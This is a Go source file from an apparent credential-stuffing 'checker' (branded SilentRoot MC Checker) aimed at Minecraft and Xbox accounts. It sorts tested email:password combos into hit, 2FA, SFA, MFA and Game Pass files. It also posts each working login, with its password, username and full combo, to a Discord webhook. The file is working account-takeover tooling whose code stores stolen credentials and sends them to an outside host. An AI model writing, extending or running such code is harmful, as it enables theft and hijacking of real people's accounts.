package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"
	"time"
)

// ResultDir is the current results folder name.
var ResultDir string

// EnsureResultDir creates the results directory for this run.
func EnsureResultDir(name string) {
	ResultDir = "results/" + name
	_ = os.MkdirAll(ResultDir, 0755)
}

// AppendResult appends a combo to the specified result file.
func AppendResult(filename, line string) {
	if ResultDir == "" {
		return
	}
	path := ResultDir + "/" + filename
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()
	_, _ = f.WriteString(line + "\n")
}

// SaveResult saves the combo to the correct result files based on type.
func SaveResult(r *AuthResult) {
	combo := r.Email + ":" + r.Password
	switch r.Type {
	case "Hit":
		AppendResult("Hits.txt", combo)
		if r.Username != "" && r.Username != "N/A" {
			line := fmt.Sprintf("Email: %s\nPassword: %s\nUsername: %s\nUUID: %s\nCapes: %s\nType: %s\n%s",
				r.Email, r.Password, r.Username, r.UUID, r.Capes, r.AccType,
				"============================")
			AppendResult("Capture.txt", line)
		}
	case "XGPU":
		AppendResult("XboxGamePassUltimate.txt", combo)
		AppendResult("Hits.txt", combo)
	case "XGP":
		AppendResult("XboxGamePass.txt", combo)
		AppendResult("Hits.txt", combo)
	case "Other":
		AppendResult("Other.txt", combo+" | "+r.AccType)
		AppendResult("Hits.txt", combo)
	case "2FA":
		AppendResult("2fa.txt", combo)
	case "ValidMail":
		AppendResult("Valid_Mail.txt", combo)
	case "SFA":
		AppendResult("SFA.txt", combo)
	case "MFA":
		AppendResult("MFA.txt", combo)
	}
}

// ---- Discord webhook for hit notifications ----

type webhookField struct {
	Name   string `json:"name"`
	Value  string `json:"value"`
	Inline bool   `json:"inline"`
}

type webhookEmbed struct {
	Title       string         `json:"title,omitempty"`
	Color       int            `json:"color"`
	Fields      []webhookField `json:"fields"`
	Thumbnail   *struct {
		URL string `json:"url"`
	} `json:"thumbnail,omitempty"`
	Footer *struct {
		Text    string `json:"text"`
		IconURL string `json:"icon_url,omitempty"`
	} `json:"footer,omitempty"`
	Timestamp string `json:"timestamp,omitempty"`
}

type webhookPayload struct {
	Username  string         `json:"username"`
	AvatarURL string         `json:"avatar_url"`
	Embeds    []webhookEmbed `json:"embeds"`
}

func sendHitWebhook(cfg *Config, r *AuthResult) {
	webhookURL := cfg.WebhookHits
	if webhookURL == "" {
		return
	}

	color := 0x00FF00 // green for hits
	if r.Type == "XGPU" {
		color = 0xFFD700
	} else if r.Type == "XGP" {
		color = 0x1E90FF
	} else if r.Type == "Other" {
		color = 0xFF8C00
	}

	thumbnailURL := "https://mc-heads.net/body/steve"
	if r.Username != "" && r.Username != "N/A" {
		thumbnailURL = "https://mc-heads.net/body/" + r.Username
	}

	fields := []webhookField{
		{Name: "📧 Email", Value: "||`" + r.Email + "`||", Inline: true},
		{Name: "🔑 Password", Value: "||`" + r.Password + "`||", Inline: true},
		{Name: "👤 Username", Value: valueOrNA(r.Username), Inline: true},
		{Name: "🎮 Account Type", Value: valueOrNA(r.AccType), Inline: true},
	}
	if r.Capes != "" {
		fields = append(fields, webhookField{Name: "🦸 Capes", Value: r.Capes, Inline: true})
	}
	fields = append(fields, webhookField{
		Name:  "📋 Combo",
		Value: "||```" + r.Email + ":" + r.Password + "```||",
	})

	payload := webhookPayload{
		Username:  "SilentRoot",
		AvatarURL: "https://i.imgur.com/wSTFkRM.png",
		Embeds: []webhookEmbed{
			{
				Color:  color,
				Fields: fields,
				Thumbnail: &struct {
					URL string `json:"url"`
				}{URL: thumbnailURL},
				Footer: &struct {
					Text    string `json:"text"`
					IconURL string `json:"icon_url,omitempty"`
				}{Text: "SilentRoot MC Checker • Go Edition"},
				Timestamp: time.Now().UTC().Format(time.RFC3339),
			},
		},
	}

	body, _ := json.Marshal(payload)
	resp, err := http.Post(webhookURL, "application/json", bytes.NewReader(body))
	if err != nil {
		return
	}
	defer resp.Body.Close()
}

func valueOrNA(s string) string {
	if s == "" {
		return "N/A"
	}
	return s
}

// BuildFinalSummary returns a formatted summary string for $stop.
func BuildFinalSummary(s Stats, elapsed time.Duration) string {
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("**📊 Final Results** — `%s`\n\n", ResultDir))
	sb.WriteString(fmt.Sprintf("✅ **Hits:** %d\n", s.Hits))
	sb.WriteString(fmt.Sprintf("❌ **Bad:** %d\n", s.Bad))
	sb.WriteString(fmt.Sprintf("🔒 **SFA:** %d\n", s.SFA))
	sb.WriteString(fmt.Sprintf("🔓 **MFA:** %d\n", s.MFA))
	sb.WriteString(fmt.Sprintf("📱 **2FA:** %d\n", s.TwoFA))
	sb.WriteString(fmt.Sprintf("🎮 **Xbox Gamepass:** %d\n", s.XGP))
	sb.WriteString(fmt.Sprintf("⭐ **Xbox Gamepass Ultimate:** %d\n", s.XGPU))
	sb.WriteString(fmt.Sprintf("🎲 **Other:** %d\n", s.Other))
	sb.WriteString(fmt.Sprintf("✉️ **Valid Mail:** %d\n", s.ValidMail))
	sb.WriteString(fmt.Sprintf("🔄 **Retries:** %d\n", s.Retries))
	sb.WriteString(fmt.Sprintf("⚠️ **Errors:** %d\n", s.Errors))
	sb.WriteString(fmt.Sprintf("\n📋 **Checked:** %d / %d\n", s.Checked, s.Total))
	sb.WriteString(fmt.Sprintf("⏱️ **Time:** %s\n", elapsed.Round(time.Second)))
	return sb.String()
}
